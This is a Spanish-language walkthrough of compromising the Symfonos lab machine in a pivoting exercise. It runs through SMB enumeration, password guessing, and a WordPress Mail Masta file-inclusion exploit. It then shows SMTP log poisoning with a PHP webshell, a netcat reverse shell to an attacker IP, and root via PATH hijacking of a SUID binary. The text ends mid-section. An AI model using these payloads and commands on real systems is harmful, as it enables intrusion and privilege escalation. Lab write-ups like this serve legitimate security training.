┌──(root㉿kali)-[/home/b1773r/Escritorio/labs/pivoting/symfonos]
└─# arp-scan --localnet
10.40.2.10 <-- Target

Escaneo agresivo Nmap:
└─# nmap -A 10.40.2.10 -oN Allports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:F7:7B:9A (Oracle VirtualBox virtual NIC)


Intentamos conectarnos a smb mediante smbmap para buscar archivos compartidos:
└─# smbmap -H 10.40.2.10
[*] Detected 1 hosts serving SMB                                                   
[*] Established 1 SMB session(s)                                                   
                                                                                                    
[+] IP: 10.40.2.10:445  Name: 10.40.2.10                Status: Authenticated      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        helios                                                  NO ACCESS       Helios personal share
        anonymous                                               READ ONLY          
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)                                                                          
                                                                                   
Accedemos al directorio anonymous con:
└─# smbmap -H 10.40.2.10 -r anonymous
./anonymous
        dr--r--r--                0 Sat Jun 29 03:14:49 2019    .
        dr--r--r--                0 Sat Jun 29 03:12:15 2019    ..
        fr--r--r--              154 Sat Jun 29 03:14:49 2019    attention.txt

Descargamos el archivo
└─# smbmap -H 10.40.2.10 --download anonymous/attention.txt
Reenombramos el archivo para un acceso más dinamico e intuitivo
└─# mv 10.40.2.10-anonymous_attention.txt attention.txt                                                
leemos el archivo
└─# cat attention.txt 

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus

Creamos un diccinario con las posibles contraseñas mostradas en el txt y tenemos en cuenta al posible usuario Zeus
└─# nano passw.txt                                                                                      
epidioko
qwerty
baseball
#Al ser un diccionario las palabras tienene que estar separadas linea a linea

Intentamos acceder a smb con el usuario "helios" que vimos en el primer escaneo probando las contraseñas guardadas
└─# smbmap -H 10.40.2.10 -u helios -p qwerty
Tenemos acceso de lectura a diversos directorios

└─# smbmap -H 10.40.2.10 -u helios -p qwerty -r helios
└─# smbmap -H 10.40.2.10 -u helios -p qwerty -r print$

Descargamos los archivos dentro de helios:
└─# smbmap -H 10.40.2.10 -u helios -p qwerty --download helios/research.txt                             
└─# smbmap -H 10.40.2.10 -u helios -p qwerty --download helios/todo.txt

leemos el primer txt
└─# cat research.txt 
leemos el segundo txt
└─# cat todo.txt                                                           
resaltamos el 3er punto que nos otoega un directorio.
3. Work on /h3l105

Intentamos acceder al directorio web pero no aparece nada port pantalla por lo que accedemos al codigo fuente y observamos un link rel='dns-prefetch' href='//symfonos.local' />.
con el comando
└─#nano /etc/hosts/
añadiremos la ip a la izquierda y href a la derecha:
10.40.2.10      symfonos.local

tras esa modificación aparecerá la web, que es un wordpress. El cual analizamos el código fuente y observamos que los plugins son visibles.
└─# curl -s -X GET "http://10.40.2.10/h3l105/" | grep "wp-content" | grep -oP "'.*?'" | grep "symfonos.local" | cut -d '/' -f 1-7 | sort -u | grep plugins

Utilizamos searchsploit para buscar buscar alguna vulnerabilidad sobre mail masta
└─# searchsploit mail masta

Mail masta tiene la vulnerabilidad Local File Inclusion. Procedemos a leer el exploit:
└─# searchsploit -x php/webapps/40290.txt | cat 

Se comprueba en web que el exploit funciona correctamente
http://10.40.2.10/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Para agilizar el proceso de lfi utilizamos un bash del youtuber y hacker "S4vitar". 
nano lfi_readfile.sh:

#!/bin/bash
# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033 [1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033 [1m"

function ctrl_c(){
    echo -e "\n\n${redColour} [ ! ] Saliendo. . . ${endColour}\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

declare -i parameter_counter=0

function fileRead ( ) { 
    filename=$1 

        echo -e "\n[+] Este es el contenido del archivo $filename:\n"
        curl -s -X GET "http://10.40.2.10/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$filename"
}

function helpPanel ( ) {
    echo -e "\n${yellowColour} [i]${endColour}${grayColour} Uso : ${endColour}\n"
    echo -e "\t${redColour}h) ${endColour}${blueColour} Mostrar este panel de ayuda${endColour}"
    echo -e "\t${redColour}f) ${endColour}${blueColour} Proporcionar ruta del archivo a leer${endColour}\n"
    exit 0
}

while getopts "hf: " arg; do
    case $arg in 
        h) ;;
        f) filename=$OPTARG; let parameter_counter+=1 ;;
    esac
done

if [ $parameter_counter -eq 1 ]; then 
    fileRead "$filename"
else
        helpPanel
fi


Probamos conexión por telnet /puerto25 con un usuario random y con un mensaje de log poisoning con el siguiente con el siguiente comando:

└─# telnet 10.40.2.10 25
Trying 10.40.2.10...
Connected to 10.40.2.10.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: s4vitar
250 2.1.0 Ok
RCPT TO: helios      
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']);?>           
.
250 2.0.0 Ok: queued as 49F01406A1
QUIT
221 2.0.0 Bye
Connection closed by foreign host.


Utilizamos curl para ver por terminal el resultado de:
└─# curl -s -X GET "http://10.40.2.10/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"

Utilizamos "[...]cmd=whoami" para comprobar si el log poisoning ha sido ejecutado satisfactoiamente

que nos devuelve un log con el usuario helios. Se puede usar telnet o Netcat.

Ejecutamos en otro terminal  escucha mediante netcat:
└─# nc -nvlp 4444

Al igual que usamos "whoami" para hacer un test, ahora ejecutamos una reverse con el siguiente comando:
└─# curl -s -X GET "http://<<IP-Victima>>/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e+/bin/bash+10.40.2.6+4444"

Tras la conexión reañizamos un tratamiento del tty con los siguientes comando:
Cargamos una pseudoconsola sobre el sistema
└─#script /dev/null -c bash
Configuramos las variables de entorno correctamente
A continuación presionamos la tecla Ctrl+Z, esto lo que hará será dejar en segundo plano nuestra sesión (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:
└─#stty raw -echo; fg
#ENTER
└─#reset xterm
expo
##Explicar que hacen los comandos
En caso de necesitar cambiar el tamaño de la terminal usamos:
└─#stty rows ## columns ##
export TERM=xterm



Una vez dentro, y como habiamos configurado estas máquinas para el laboratorio de pivoting; usamos el comando:
└─#ip a
para ver las configuraciones de red.

helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$ cd /dev/shm/
##Explicar porqué en /dev/shm/

Ya que no poseemos la herramienta nmap tocará realizar un escaneo mediante bash:
helios@symfonos:/dev/shm$ nano hostDiscovery.sh
##adjuntar código


ejecutamos HostDiscovery.sh y mediante ping veremos los dispositivos:
helios@symfonos:/dev/shm$ ./hostDiscovery.sh 
[+] El host 10.30.2.5 -  ACTIVE
[+] El host 10.30.2.2 -  ACTIVE
[+] El host 10.30.2.4 -  ACTIVE
[+] El host 10.30.2.3 -  ACTIVE
[+] El host 10.30.2.1 -  ACTIVE

Pasamos a Rootear la máquina.


Nos desplazamos a la raíz 
helios@symfonos:/dev/shm$ cd /

Y listamos los binarios donde el propietario sea root:
helios@symfonos:/$ find \-perm -4000 -user root 2>/dev/null
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/newgrp
./usr/bin/chsh
./usr/bin/chfn
./opt/statuscheck
./bin/mount
./bin/umount
./bin/su
./bin/ping

Analizando "./opt/statuscheck" con:
$ file ./opt/statuscheck
descubrimos que trata de un binario que al ejecutarse se asemeja al comando curl.
helios@symfonos:/dev/shm$ cd /
helios@symfonos:/$ ./opt/statuscheck 
HTTP/1.1 200 OK
Date: Mon, 12 Feb 2024 16:31:19 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html


Con strings listamos las cadenas de caracteres imprimibles: 
strings ./opt/statuscheck | less
->curl -I H

Vemos que hace un llamado a curl de manera relativa  y no absoluta, esto nos permite el pathhighjacking

Si consiguieses ejecutar algún comando en alguno de estos binarios recibirías temporalmente permisos root. En este caso se debe a que dentro de este statuscheck tenemos el curl modificado que hemos creado con un chmod otorgando privilegios al bin/bash.
$nano curl
->chmod u+s /bin/bash


Dentro de /dev/shm ejecutamos:
$ /opt/statuscheck 
que ejecutará nuestro curl "malicioso"

con ls -l /bin/bash 
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
nos muestra que tienen permisos de ejecución y se ejecuta como root.

Para ejecutar con privilegios usamos:
bash -p
nos devuelve una terminal como root, cosa que comprobamos con un
bash-4.4# whoami
root
Cara al pivoting no es necesario entrar como root.

bash-4.4# cd root/
bash-4.4# cat proof.txt
 y conseguimos la flag.

symfonos2 IP 10.30.2.4

Como no disponemos de Nmap para escanear los puertos abiertos usamos código en bash para descubrir puertos abiertos:
